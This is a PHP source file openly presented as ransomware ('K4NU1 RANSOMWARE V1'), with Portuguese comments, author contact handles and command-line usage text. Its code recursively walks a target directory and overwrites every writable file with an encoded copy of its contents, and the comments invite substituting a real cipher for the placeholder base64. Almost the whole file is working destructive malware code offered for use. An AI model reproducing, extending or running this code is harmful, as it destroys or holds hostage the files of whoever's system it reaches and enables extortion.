<?php
/*
GITHUB:https://github.com/Kanui-C
TELEGRAM:@bdpwd
DISCORD:!TheKanui#0105



*/
class ransomware{
    //Metodo Construtor
    public function __construct($alvo){
        //Passa o argumento 1 para o metodo GetFile
        $this->GetFile($alvo);
        //Banner =)
        echo "{K4NU1 RANSOMWARE V1 =) }\n";
    }
    //Metodo responsavel pela criptografia
    public function criptografa($conteudo){
        /*
        Use aqui a criptografia de sua peferencia
        (usei o base64 apenas para exemplo)
        Retorna o conteudo criptografado para o metodo GetContent
        */
        return base64_encode($conteudo);
        
    
    }
    //Metodo responsavel por obter o conteudo do arquivo
    public function GetContent($alvo){
    //Abre o arquivo no modo de Leitura
    $arquivo = fopen($alvo, "rb");
    //Verifica se o arquivo foi aberto com sucesso
    if(!$arquivo){
        //Caso aconteça algum erro ele retorna Sem permissao!
        Echo "[Sem permissão!\n]";
    }
    //Obtem o conteudo do arquivo e armazena em conteudo
    $conteudo = fread($arquivo, filesize($alvo));
    //Fecha o arquivo
    fclose($arquivo);
    //Recebe o conteudo criptografado do metodo GetContent
    $criptografado = $this->criptografa($conteudo);
    //Retorna o conteudo criptografado para o metodo GetFile(Variavel:criptografado)
    return $criptografado;
    }
    //Metodo responsavel por receber arquivos e diretorios
    public function GetFile($dir){
        //Obtem todo o conteudo do diretorio passado (TENHA CUIDADO POIS ESSA FUNÇAO SE INICIA NO DIRETORIO /)
        foreach(glob($dir . DIRECTORY_SEPARATOR . "*") as $alvo){
            //Verificando se é arquivo ou diretorio
            if(!is_dir($alvo)){
                /*
                Verifica se o arquivo/diretorio guardado na
                variavel alvo é diferente de '.'(Diretorio atual)
                e '..'(Diretorio antes) e verifica se tem permissao
                de escrita
                */
                if($alvo != "." && $alvo != ".." && is_writable($alvo)){
                  //Recebe o conteudo criptografado do metodo getcontent
                  $criptografado = $this->GetContent($alvo);
                  /*
                  Abre o arquivo guardado na variavel alvo em modo de escrita
                  Obs:Quando o arquivo é aberto apenas usando w 
                  ele é automaticamente zerado!(Todo seu conteudo é apagado)
                  */
                  $escrever = fopen($alvo, "w");
                  //Verifica se o arquivo foi aberto com sucesso!
                  if($escrever){
                      //Escreve o conteudo criptografado no arquivo alvo
                      fwrite($escrever, $criptografado);
                      //Fecha o arquivo
                      fclose($escrever);
                      //Retorna OK caso tenha dado certo
                      echo "$alvo [Concluido]\n";
                  }
                  //Se nao foi possivel abrir o arquivo retorna failed
                  else {
                      echo "$alvo [Falha]\n";
                  }
                //Caso seja o diretorio '.' ou '..' ele retorna false e sai do if!
                }else{
                    //"PULOU O DIRETORIO/ARQUIVO"
                    echo "$alvo [Pulado]\n";
                }
            }else{
                /*
                Caso nao seja uma pasta ele ira retornar a mesma para o metodo
                GetFile, Fazendo assim uma busca recursiva!
                */
                $this->GetFile($alvo);
            }
        }
    }
}
//Caso o usuario passe menos de 2 argumentos exiba:
if($argc < 2){
    echo "
    Code owner:https://github.com/Kanui-C
    
    É necessario passar o diretorio!\n
    It is necessary to pass the directory!\n

    Modo de uso: php $argv[0] DIRECTORY\n
    Use: php $argv[0] DIRECTORY\n

    Tenha cuidado!\n
    Be Careful!\n
    
    
    
    if you don't speak portuguese use google translator!\n
    ";
}
//Se nao execute:
else{
/*Instanciando um novo objeto passando o
primeiro parametro("Passando o diretorio alvo")*/
$ramsomwareini = new ransomware($argv[1]);
}
?>
